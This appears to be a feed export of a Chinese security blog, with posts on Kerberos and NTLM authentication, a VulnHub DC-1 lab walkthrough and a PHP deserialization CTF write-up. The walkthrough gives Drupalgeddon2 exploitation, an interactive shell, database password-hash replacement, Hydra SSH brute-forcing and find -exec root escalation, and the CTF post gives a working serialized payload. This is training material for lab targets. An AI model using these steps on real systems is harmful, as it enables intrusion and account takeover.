    <content type="html"><![CDATA[<h3 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h3><h5 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h5><p><strong>Kerberos</strong>是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。这个词又指麻省理工学院为这个协议开发的一套计算机软件。</p><h5 id="协议内容："><a href="#协议内容：" class="headerlink" title="协议内容："></a>协议内容：</h5><ul><li><p>client：需要进行认证的客户端</p></li><li><p>KDC（Key Distribution Center）&#x3D; 密钥分发中心</p></li><li><p>AS（Authentication Server）&#x3D; 认证服务器</p></li><li><p>TGS（Ticket Granting Server）&#x3D; 票据授权服务器</p></li><li><p>AD (Active Directory) &#x3D;存放client白名单和用户密码</p></li><li><p>TGT（Ticket Granting Ticket）&#x3D; 票据授权票据，票据的票据</p></li><li><p>server：提供服务的服务端</p></li></ul><p>进行验证时，AS和TGS是在KDC中的</p><h5 id="简洁的验证流程："><a href="#简洁的验证流程：" class="headerlink" title="简洁的验证流程："></a>简洁的验证流程：</h5><p>在进行Kerberos验证时，分为三步：</p><ol><li>首先我们需要client(客户端)向KDC(密钥分发中心)发送第一次请求，在KDC接受到请求后将发送过来的hash值交给AS(认证服务器)进行验证，此刻AD会验证client是否在白名单中，如果在白名单中，即AS验证成功，AS随即生成TGT(票据授权票据)。</li><li>在第一步client经过AS验证成功后，AS生成了TGT返回给了client，这是第一次验证。client在接收到TGT之后进行第二次验证，将刚刚接收到的TGT发送给KDC的TGS(票据授权服务器)进行验证，如果验证成功，TGS将会发送对应server的票据(ST)给client。</li><li>最后，经过两次验证，client已经从KDC那里拿到了server的ticket，所以最后一步，客户端只需要将得到的票据(ST)发送给Server进行效验，成功后即可访问server。</li></ol><p><img src="https://tva3.sinaimg.cn/large/007u0ID7ly1h3oyc4x7wvj31rg11pqi1.jpg" alt="11111"></p><p>​                                                                (图片来源：Y5neKO)</p><h3 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h3><h5 id="简介：-1"><a href="#简介：-1" class="headerlink" title="简介："></a>简介：</h5><p>NTLM 是指telnet的一种验证身份方式，即问询&#x2F;应答身份验证协议，是 Windows NT 早期版本的标准安全协议，Windows 2000 支持 NTLM 是为了保持向后兼容。Windows 2000内置三种基本安全协议之一。</p><h5 id="关键词："><a href="#关键词：" class="headerlink" title="关键词："></a>关键词：</h5><ul><li>NTLM Hash：存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果</li><li>NTLM：除 Kerberos之外的一种网络认证协议，只支持 Windows</li><li>LSASS：Windows系统的安全机制(lsass.exe)。用于本地安全和登陆策略</li></ul><h5 id="验证流程："><a href="#验证流程：" class="headerlink" title="验证流程："></a>验证流程：</h5><p>本地认证的过程中，用户登录时，系统会将用户输入的明文密码加密成NTLM Hash，然后和SAM文件中的NTLM Hash进行比较从而完成认证，在域环境中，域内用户的密码哈希是存在域控的 NTDS.dit 文件里面的。</p><p>SAM文件是<strong>windows的用户账户数据库</strong>,所有用户的登录名及口令等相关信息都会保存在这个文件中。</p><p>SAM文件路径  C:\Windows\System32\Config\SAM</p><p>当用户注销、重启、锁屏后，操作系统会让 winlogon.exe 显示登录界面（输入框）。当 winlogon.exe 接收输入后，会将密码交给lsass进程。lsass.exe 是一个系统进程，用于微软Windows系统的安全机制。</p><p>备注：在NTLM hash之前，windows是使用LM hash验证的LM Hash其本质是使用DES加密，从windows vista和windows server2008开始 windows默认禁用LM Hash。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-1靶机渗透</title>
    <link href="/2022/06/29/DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
    <url>/2022/06/29/DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="DC-1靶机渗透思路："><a href="#DC-1靶机渗透思路：" class="headerlink" title="DC-1靶机渗透思路："></a>DC-1靶机渗透思路：</h3><p>下载链接：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p><p>打开虚拟机在DC-1靶机的设置中修改网络适配器为NAT模式。</p><p>记得记一下DC-1的MAC地址。</p><p>![3I5UXP35%7I7&#96;(<del>$B</del>OBVEJ](<a href="https://tva1.sinaimg.cn/large/007u0ID7ly1h3ozt0y2ppj30nw0ru0wj.jpg">https://tva1.sinaimg.cn/large/007u0ID7ly1h3ozt0y2ppj30nw0ru0wj.jpg</a>)</p><p>首先我们知道了拿到靶机需要拿到5个flag，然后根据每个flag的提示找到下一个flag。</p><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>DC-1和kali现在属于同一个网段，我们根据靶机的MAC地址，使用nmap扫描可以找到DC-1的ip地址，然后进行端口扫描。</p><p><code>nmap -sP 192.168.140.0/24</code></p><p><code>nmap -sV -A 192.168.140.132</code></p><p><img src="https://tvax2.sinaimg.cn/large/007u0ID7ly1h3oj5u8r5wj30ia0kaqn5.jpg" alt="3BWV~%AZRBMBPI682RBSLOJ"></p><p>发现80端口开放，查看网站信息，发现是一个Drupal框架搭建的网站，使用Wappalyzer，或者查看robots.txt暴露出的信息，可以获取到Drupal的版本。</p><p><img src="https://tva4.sinaimg.cn/large/007u0ID7ly1h3oj6n41ptj317z0nqgtq.jpg" alt="JR6FVYIQ4A8373}))_4C0BL"></p><h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>在MSF中搜索，drupal利用模块进行攻击。</p><p><img src="http://tva1.sinaimg.cn/large/007u0ID7ly1h3ozv1ryfij30vm0ln1kx.jpg" alt="QRTO@148N@YJ1QDC%T9EOKG"></p><p>使用exploit命令执行攻击，利用drupal_drupalgeddon2</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h3oj92fhdej30s60luh9b.jpg" alt="QRTO@148N@YJ1QDC%T9EOKG"></p><p>ls可以看到 flag1.txt</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h3oj9o20avj30gc05w0x1.jpg" alt="16$IOMS}8OAN3P~SX269XKD"> flag1.txt<br>Every good CMS needs a config file - and so do you.</p><p>根据flag1的提示，我们查看CMS配置文件，Drupal的配置文件是网站根目录下的&#x2F;site&#x2F;defaultx下的setting.php文件。</p><p><img src="https://tva4.sinaimg.cn/large/007u0ID7ly1h3oj43z84sj30gr0f4n6f.jpg" alt="LRREH6N1IJ~S9$}9MFC2J{Q"></p><p>flag2：</p><p>Brute force and dictionary attacks aren’t the</p><p>only ways to gain access (and you WILL need access).</p><p>What can you do with these credentials?</p><p>翻译：</p><p>暴力和字典攻击不是</p><p>只有获得访问权限的方法（您将需要访问权限）。</p><p>您可以使用这些凭据做什么？</p><p>并且我们查看到了数据库账号密码</p><p>username：dbuser</p><p>password：R0ck3t</p><h4 id="登录数据库"><a href="#登录数据库" class="headerlink" title="登录数据库"></a>登录数据库</h4><p>使用命令shell拿到shell，然后再使用命令<code>python -c import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code>获取一个交互式shell</p><p><img src="https://tva2.sinaimg.cn/large/007u0ID7ly1h3oj390rqij311q0lv4kj.jpg" alt="QRTO@148N@YJ1QDC%T9EOKG"></p><p>查看users表，如果pass是明文，我们就可以直接登录192.168.140.132这个网站，密文产生的脚本是&#x2F;scripts&#x2F;password-hash.sh，使用这个脚本产生123456密文，产生的密文替换数据库中admin的密文，admin用户的密码就能改成123456，完成后使用update命令更新。</p><p><img src="https://tvax1.sinaimg.cn/large/007u0ID7ly1h3oi0457huj313m0cq49y.jpg" alt="QRTO@148N@YJ1QDC%T9EOKG"></p><h4 id="登录网站"><a href="#登录网站" class="headerlink" title="登录网站"></a>登录网站</h4><p>登录drupal，发现flag3，提示要使用find命令</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h3oj25aheij316n0kaq8o.jpg" alt="P5@8%I_~_K8YJ80Q9%PB84L"></p><h4 id="爆破ssh密码"><a href="#爆破ssh密码" class="headerlink" title="爆破ssh密码"></a>爆破ssh密码</h4><p>并且发现了flag4且打开了ssh，所以尝试使用九头蛇爆破ssh密码，得到登录密码为orange，登录之后在flag4用户的home目录中，发现flag4.txt</p><p><img src="https://tva2.sinaimg.cn/large/007u0ID7ly1h3oirmt3o0j314e0m0e81.jpg" alt="T8G@`FG@TOTDA55`L}TX5QJ"></p><p><img src="https://tvax3.sinaimg.cn/large/007u0ID7ly1h3oiqz1jlkj30vt0ire2h.jpg" alt="QRTO@148N@YJ1QDC%T9EOKG"></p><h4 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h4><p>然后使用find命令提权：</p><p>使用方法find (一个路径或文件必须存在) -exec 执行命令 （结束）;</p><p><img src="https://tva3.sinaimg.cn/large/007u0ID7ly1h3oit9dc74j30hs0f2qee.jpg" alt="G(II4(UWC3TH3881ND(GMYA"></p><p>使用命令<code>find ke1r -exec &#39;/bin/sh&#39; \;</code>最终提权至root权限，ls找到finalflag.txt</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h3oiuu31zoj30j40h1498.jpg" alt="TR(%2LI(TW3G$B7SBB6BM3T"></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化</title>
    <link href="/2022/04/17/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/04/17/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>序列化(serialize)就是将对象转换为字符串。反序列化(unserialize)则相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>PHP 对属性或方法的<strong>访问控制</strong>，是通过在前面添加<strong>关键字</strong> public（公有），protected（受保护）或 private（私有）来实现的。<br>public（公有）：公有的类成员可以在<strong>任何地方被访问</strong>。<br>protected（受保护）：受保护的类成员则可以<strong>被其自身以及其子类和父类访问</strong>。<br>private（私有）：私有的类成员则<strong>只能被其定义所在的类访问</strong>。</p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>有类时会触发 <strong>魔术方法</strong></p><p>那什么时魔术方法呢？PHP中把两个下划线开头的方法称为魔术方法(Magic methods)</p><p>serialize() 函数会检查类中是否存在一个魔术方法。如果存在，该方法会先被调用，然后才执行序列化操作。</p><p><strong>魔术方法</strong>包括：</p><table><thead><tr><th>魔术方法</th><th>用处</th></tr></thead><tbody><tr><td>__construct()</td><td>实例化类时自动调用</td></tr><tr><td>__destruct()</td><td>类对象使用结束时自动调用</td></tr><tr><td>__set()</td><td>在给未定义的属性赋值时自动调用</td></tr><tr><td>__get()</td><td>调用未定义的属性时自动调用</td></tr><tr><td>__isset()</td><td>使用 isset() 或 empty() 函数时自动调用</td></tr><tr><td>__unset()</td><td>使用 unset() 时自动调用</td></tr><tr><td>__sleep()</td><td>使用 serialize 序列化时自动调用</td></tr><tr><td>__wakeup()</td><td>使用 unserialize 反序列化时自动调用</td></tr><tr><td>__call()</td><td>调用一个不存在的方法时自动调用</td></tr><tr><td>__callStatic()</td><td>调用一个不存在的静态方法时自动调用</td></tr><tr><td>__toString()</td><td>把对象转换成字符串时自动调用</td></tr><tr><td>__invoke()</td><td>当尝试把对象当方法调用时自动调用</td></tr><tr><td>__set_state()</td><td>当使用 var_export() 函数时自动调用，接受一个数组参数</td></tr><tr><td>__clone()</td><td>当使用 clone 复制一个对象时自动调用</td></tr><tr><td>__debugInfo()</td><td>使用 var_dump() 打印对象信息时自动调用</td></tr></tbody></table><p>简单的序列化：</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h1cpb3ulbkj30mz0ibjtf.jpg" alt="555"></p><p>序列化后各个字符串的含义：</p><p><img src="https://tvax4.sinaimg.cn/large/007u0ID7ly1h1cpc2mg5qj30vm0btn2n.jpg" alt="556"></p><h3 id="PHP反序列化漏洞原理"><a href="#PHP反序列化漏洞原理" class="headerlink" title="PHP反序列化漏洞原理"></a>PHP反序列化漏洞原理</h3><p>序列化和反序列化本身没有问题，但是如果<strong>反序列化的内容是用户可以控制的</strong>，且<strong>后台不正当的使用了PHP中的魔法函数</strong>，就会导致安全问题。当传给<code>unserialize()</code>的<strong>参数可控</strong>时，可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><a href="%5BCTFHub%5D(https://www.ctfhub.com/#/challenge)">CTFHub中 2020-网鼎杯-青龙组-Web-AreUSerialz</a></p><p><strong>代码审计</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>        <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>&#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br><span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>首先代码审计就是看两点，一有无漏洞，二有无可控变量。</p><p>我们发现源代码最后76行有可控变量str通过get传参，并且发现有unserialize反序列化。</p><p>我们再看到 flag.php 是在这个高亮化文件里面的，并且发现有class(类)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br></code></pre></td></tr></table></figure><p>在反序列化后，相当于重新生成了一个对像，这个对象在程序结束时 <strong>析构执行</strong>­_destruct（）&#x2F;&#x2F;第58行</p><p>如果op值为2则强制将op的值变为1，content值为空，调用<strong>process函数</strong>。&#x2F;&#x2F;第20行</p><p>如果op值为1，则进入“写”函数；如果op值为2，则进入“<strong>读”函数</strong>。</p><p>这里我们需要读取到flag.php中的答案所以需要调用“读”函数&#x2F;&#x2F;第45行</p><p>如果filename有值，则file_get_contents()函数把整个文件读入一个字符串中,如果给filename赋值为flag.php 那么我们就能读出flag了。</p><p>但是在destruct函数中进行了判断把2强制转换成了1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>        <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们这里需要知道，用三个等号时，除了两个变量的值相同外，还必须这两个变量的类型相同，而用两个等号时，只需要两个变量值相同。</p><p>我们构造payload时，构造op&#x3D;‘ 2’字符串，则op&#x3D;‘2’就不成立，此时op就成了我们自己设置的值。然后通过process()函数调用后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>因为这里为 op &#x3D;&#x3D; “2”为弱类型对比只需要值相等就能调用“读”函数。就能读出flag.php文件了。</p><p><strong>构造payload</strong></p><p><img src="https://tva2.sinaimg.cn/large/007u0ID7ly1h1cq8e03mwj30di069tab.jpg" alt="123456789"></p><p>序列化出来的payload为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>FileHandler%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>op%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>+<span class="hljs-number">2</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>filename%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>flag.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>content%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>注意这里要把protect改为public才是公有的,并且要将FileHandler用new实例化。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-MISC基础知识之图片</title>
    <link href="/2022/04/05/CTF-MISC%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2022/04/05/CTF-MISC%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p><strong>MISC作为CTF中比较重要的一类题型，分值占比较大，为了帮助大家更好的学习MISC的做题方法，我总结了常见的图片类型中的几种题型及工具：</strong></p><ul><li><p>图片，音频，视频</p><blockquote><p>首先就是大家常见的图片分析，图片修复，图片修改长宽高，图片拼接，二维码扫描，LSB隐写等等。</p></blockquote><p>遇到图片类型的题，首先最基础的图片分析，将图片丢到winhex或者010editor中分析。分析此图片有无隐写信息或分析是否包含压缩包等。</p><p><img src="http://tva4.sinaimg.cn/large/007u0ID7gy1h60frqvvwkj30tw0lnnik.jpg" alt="1662712290424">（010Editor使用示例)</p><p>010Editor下载链接  <a href="https://download.sweetscape.com/010EditorWin32Installer11.0.1.exe">https://download.sweetscape.com/010EditorWin32Installer11.0.1.exe</a></p><p>以下是总结的各类型文件的文件头：</p><blockquote><p>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424DC001<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>旧版office MS Word&#x2F;Excel (xls.or.doc or.ppt)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645</p><p>JPEG 